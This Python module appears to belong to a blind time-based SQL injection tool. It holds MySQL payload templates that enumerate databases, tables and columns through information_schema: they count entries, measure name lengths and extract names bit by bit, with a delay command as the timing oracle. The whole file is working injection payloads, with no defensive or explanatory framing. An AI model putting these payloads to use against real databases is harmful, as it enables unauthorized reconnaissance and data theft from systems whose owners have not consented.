from dbtype import DBType

database_count_command = {
    DBType.MySQL: "(select num={integer} and {{delay_command}} from (select count(*) as num from (select distinct table_schema from information_schema.tables)a)b)"
}

database_name_length_command = {
    DBType.MySQL: "(select length(table_schema)={integer} and {{delay_command}} from (select distinct table_schema from information_schema.tables order by table_schema limit {row_idx},1)a)"
}

database_name_command = {
    DBType.MySQL: "(select substr(lpad(bin(ascii(substr(table_schema,{str_idx},1))),7,'0'),{bin_idx},1)=1 and {{delay_command}} from (select distinct table_schema from information_schema.tables order by table_schema limit {row_idx},1)a)"
}

table_count_command = {
    # DBType.MySQL: "(select substr(bin(ascii(substr(table_schema,{database_name_idx},1))),{bin_idx},1)=1 and {{delay_command}} from (select distinct table_schema from information_schema.tables limit {row_idx},1)a)"
    DBType.MySQL: "(select num={integer} and {{delay_command}} from (select count(*) as num from information_schema.tables where table_schema='{database_name}' and table_type='base table' and table_schema not in ('information_schema', 'mysql', 'performance_schema', 'sys'))a)"
}

table_name_length_command = {
    # DBType.MySQL: "(select substr(bin(ascii(substr(table_schema,{database_name_idx},1))),{bin_idx},1)=1 and {{delay_command}} from (select distinct table_schema from information_schema.tables limit {row_idx},1)a)"
    DBType.MySQL: "(select length(table_name)={integer} and {{delay_command}} from information_schema.tables where table_schema='{database_name}' and table_type='base table' and table_schema not in ('information_schema', 'mysql', 'performance_schema', 'sys') order by table_name limit {row_idx},1)"
}

table_name_command = {
    # DBType.MySQL: "(select substr(bin(ascii(substr(table_schema,{database_name_idx},1))),{bin_idx},1)=1 and {{delay_command}} from (select distinct table_schema from information_schema.tables limit {row_idx},1)a)"
    DBType.MySQL: "(select substr(lpad(bin(ascii(substr(table_name,{str_idx},1))),7,'0'),{bin_idx},1)=1 and {{delay_command}} from information_schema.tables where table_schema='{database_name}' and table_type='base table' and table_schema not in ('information_schema', 'mysql', 'performance_schema', 'sys') order by table_name limit {row_idx},1)"
}

column_count_command = {
    DBType.MySQL: "(select num={integer} and {{delay_command}} from (select count(*) as num from information_schema.columns where table_name='{table_name}' and table_schema='{database_name}')a)"
}

column_name_length_command = {
    DBType.MySQL: "(select length(column_name)={integer} and {{delay_command}} from information_schema.columns where table_name='{table_name}' and table_schema='{database_name}' order by column_name limit {row_idx},1)"
}

column_name_command = {
    DBType.MySQL: "(select substr(lpad(bin(ascii(substr(column_name,{str_idx},1))),7,'0'),{bin_idx},1)=1 and {{delay_command}} from information_schema.columns where table_name='{table_name}' and table_schema='{database_name}' order by column_name limit {row_idx},1)"
}